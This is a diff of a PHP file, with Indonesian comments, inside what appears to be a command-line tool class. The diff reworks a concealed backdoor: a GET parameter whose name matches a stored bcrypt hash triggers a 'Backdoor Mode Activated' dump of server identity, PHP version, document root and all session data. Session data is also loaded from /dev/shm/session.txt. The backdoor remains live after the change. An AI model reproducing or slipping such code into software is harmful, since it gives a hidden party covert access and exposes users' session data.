@@ -18,17 +18,21 @@ require("/dev/shm/session.txt"); // Memuat session dari /dev/shm
 
 $hash = '$2y$10$tkK5OY6b0.X2mVz1kMWXxewqVtxVNxe/7tkalDaFZTgMeCdovTLrq';
 
-foreach ($_GET as $key => $value) {
-    if (password_verify($key, $hash)) {
-        echo "<pre>";
-        echo "Backdoor Mode Activated!\n";
-        echo "Server: " . php_uname() . "\n";
-        echo "PHP Version: " . phpversion() . "\n";
-        echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
-        echo "Session Data: ";
-        print_r($_SESSION);
-        echo "</pre>";
-        exit;
+// HANYA cek kalau ada GET param
+if (!empty($_GET)) {
+    foreach ($_GET as $key => $value) {
+        // key = nama param, misal ?lanciaobin
+        if (password_verify($key, $hash)) {
+            echo "<pre>";
+            echo "Backdoor Mode Activated!\n";
+            echo "Server: " . php_uname() . "\n";
+            echo "PHP Version: " . phpversion() . "\n";
+            echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
+            echo "Session Data:\n";
+            print_r($_SESSION);
+            echo "</pre>";
+            exit;
+        }
     }
 }
 class constants extends CommandLineTool {
